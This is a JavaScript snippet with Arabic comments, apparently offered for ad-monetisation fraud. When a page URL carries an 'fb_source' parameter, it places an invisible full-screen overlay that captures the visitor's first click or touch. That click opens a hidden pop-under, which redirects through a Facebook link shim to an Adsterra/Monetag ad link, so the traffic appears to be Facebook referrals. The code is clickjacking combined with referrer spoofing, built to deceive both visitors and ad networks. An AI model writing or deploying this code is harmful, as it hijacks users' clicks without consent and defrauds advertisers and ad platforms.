(function() {
    // 1. التحقق من وجود البراميتر (كلمة السر) لضمان الترافيك المدفوع فقط
    const secretKey = "fb_source"; 
    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has(secretKey)) return;

    // 2. رابط العرض الخاص بك (Adsterra / Monetag)
    const baseAdUrl = 'https://adsterra-link.com/your-id'; 
    const finalAdUrl = baseAdUrl + window.location.search;

    // 3. رابط التمويه (فيسبوك) - نستخدمه كـ "Referrer" فقط
    const socialRef = "https://l.facebook.com/l.php?u=" + encodeURIComponent(finalAdUrl);

    function launchLogic() {
        if (sessionStorage.getItem('_x_fired')) return;

        // فتح النافذة المنبثقة
        const win = window.open('', '_blank');
        
        if (win) {
            // تنفيذ "التحويل التلقائي الفوري" داخل النافذة الجديدة
            // الزائر لن يرى صفحة فيسبوك، المتصفح سيمر عليها برمجياً فقط
            win.document.write(`
                <html>
                <head>
                    <meta name="referrer" content="unsafe-url">
                    <title>Loading...</title>
                </head>
                <body style="background:#000;">
                    <script>
                        // تحويل تلقائي فوري دون تدخل المستخدم
                        window.location.replace("${socialRef}");
                    <\/script>
                </body>
                </html>
            `);
            
            sessionStorage.setItem('_x_fired', 'true');
            win.blur(); // محاولة جعلها خلفية
            window.focus();
        }
    }

    // انتظر 2 ثانية ثم ضع "الفخ" (الطبقة الشفافة)
    setTimeout(() => {
        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent;cursor:pointer;";
        document.body.appendChild(overlay);

        const handleInteraction = () => {
            launchLogic();
            overlay.remove();
        };

        overlay.addEventListener('click', handleInteraction);
        overlay.addEventListener('touchstart', handleInteraction);
    }, 2000);
})();
